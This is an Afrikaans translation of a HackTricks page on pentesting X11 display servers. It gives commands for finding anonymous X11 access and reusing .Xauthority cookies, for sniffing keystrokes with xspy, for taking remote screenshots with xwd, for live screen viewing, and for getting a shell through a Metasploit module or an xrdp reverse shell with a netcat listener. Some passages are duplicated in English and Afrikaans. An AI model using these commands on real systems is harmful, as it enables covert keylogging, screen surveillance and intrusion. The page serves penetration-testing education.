# 6000 - Pentesting X11

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hack-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutjagters!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek

**Hack-nuus in werklikheid**\
Bly op hoogte van die vinnige w√™reld van hacking deur middel van werklike nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutjagbountes wat bekendgestel word en belangrike platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## Basiese Inligting

**X Window System** (X) is 'n veelsydige venstersisteem wat algemeen voorkom op UNIX-gebaseerde bedryfstelsels. Dit bied 'n raamwerk vir die skep van grafiese **gebruikerskoppelvlakke (GUI's)**, met individuele programme wat die gebruikerskoppelvlakontwerp hanteer. Hierdie buigsaamheid maak diverse en aanpasbare ervarings binne die X-omgewing moontlik.

**Verstekpoort:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## Opname

Kyk vir **anonieme verbinding:**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### Plaaslike Opsomming

Die l√™er **`.Xauthority`** in die gebruiker se tuisskyf word **gebruik** deur **X11 vir outorisasie**. Van [**hier**](https://stackoverflow.com/a/37367518):
```bash
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-towenaar-koekie-1: Genereer 128-bits sleutel ("koekie"), stoor dit in \~/.Xauthority (of waar die XAUTHORITY envvar na verwys). Die kli√´nt stuur dit plain na die bediener! Die bediener kontroleer of dit 'n kopie van hierdie "koekie" het en as dit wel die geval is, word die verbinding toegelaat. Die sleutel word gegenereer deur DMX.

{% hint style="warning" %}
Om die koekie te **gebruik**, moet jy die env-var stel: **`export XAUTHORITY=/pad/na/.Xauthority`**
{% endhint %}

#### Plaaslike Enumerasie-sessie
```bash
$ w
23:50:48 up 1 day, 10:32,  1 user,  load average: 0.29, 6.48, 7.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty7     :0               13Oct23 76days 13:37   2.20s xfce4-session
```
## Verifieer Verbinding

To verify the X11 connection, you can use the `xeyes` command. This command opens a small window with a pair of eyes that follow the mouse cursor.

Om die X11-verbinding te verifieer, kan jy die `xeyes`-opdrag gebruik. Hierdie opdrag open 'n klein venster met 'n paar o√´ wat die muisaanwyser volg.

```bash
$ xeyes
```

If the eyes appear on your screen, it means that the X11 connection is working properly.

As die o√´ op jou skerm verskyn, beteken dit dat die X11-verbinding korrek werk.
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Sleutelloggin

[xspy](http://tools.kali.org/sniffingspoofing/xspy) om die sleutelbordtoetse te snuif.

Voorbeelduitset:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Skermskote vaslegging

Skermskote vaslegging is 'n tegniek wat gebruik word om visuele inligting van 'n X11-sessie vas te l√™. Dit kan gebruik word tydens pentesting om toegang tot die skerm van 'n gebruiker te verkry en sensitiewe inligting te onderskep.

### X11-sessies

X11 is 'n protokol wat gebruik word vir die vertoon van grafiese gebruikerskoppelvlakke op Unix-gebaseerde stelsels. Dit maak gebruik van 'n klient-bedienersmodel, waar die X-server die skerm vertoon en die X-kli√´nt programme gebruik om die vertooning te beheer.

### Skermskote vasleggingstegnieke

Daar is verskeie tegnieke wat gebruik kan word om skermskote vas te l√™ in 'n X11-sessie. Hier is 'n paar voorbeelde:

1. **xwd**: Die xwd-opdrag kan gebruik word om 'n skermskoot van 'n X11-sessie te neem en dit na 'n l√™er te stuur. Byvoorbeeld:

   ```
   xwd -root -out screenshot.xwd
   ```

2. **xwdtopnm**: Die xwdtopnm-hulpprogramma kan gebruik word om 'n xwd-l√™er na 'n draagbare gryskaartformaat (PNM) om te skakel. Byvoorbeeld:

   ```
   xwdtopnm screenshot.xwd > screenshot.pnm
   ```

3. **convert**: Die convert-opdrag van die ImageMagick-pakket kan gebruik word om 'n skermskoot na 'n ander formaat, soos JPEG of PNG, om te skakel. Byvoorbeeld:

   ```
   convert screenshot.pnm screenshot.jpg
   ```

### Gebruik van skermskote vaslegging in pentesting

By die uitvoering van 'n pentest, kan skermskote vaslegging gebruik word om toegang tot die skerm van 'n gebruiker te verkry en potensi√´le kwesbaarhede te identifiseer. Dit kan ook gebruik word om inligting soos wagwoorde, persoonlike inligting en ander sensitiewe data te onderskep.

Dit is belangrik om etiese hackingpraktyke te volg en slegs skermskote vas te l√™ met die toestemming van die eienaar van die stelsel.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Afstandskantoor Aansig

Bron: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Weg van: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

Eerst moet ons die ID van die venster vind deur xwininfo te gebruik.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

Vir **lewende siening** moet ons gebruik maak van
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Kry Skulp

Om 'n skulp te kry
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Ander manier:

**Omgekeerde Skulp:** Xrdp maak dit ook moontlik om 'n omgekeerde skulp te gebruik deur middel van Netcat. Tik die volgende bevel in:
```bash
./xrdp.py \<IP:0> ‚Äìno-disp
```
In die koppelvlak kan jy die **R-shell opsie** sien.

Begin dan 'n **Netcat luisteraar** in jou plaaslike stelsel op poort 5555.
```bash
nc -lvp 5555
```
Plaas dan jou IP-adres en poort in die **R-Shell** opsie en klik op **R-shell** om 'n skulp te kry


## Verwysings
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

## Shodan

* `port:6000 x11`

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutvinders van beloningsjagte!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek

**Hacknuus in werklikheid**\
Bly op hoogte van die vinnige w√™reld van hacking deur middel van werklike nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutvindings wat bekendgestel word en belangrike platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
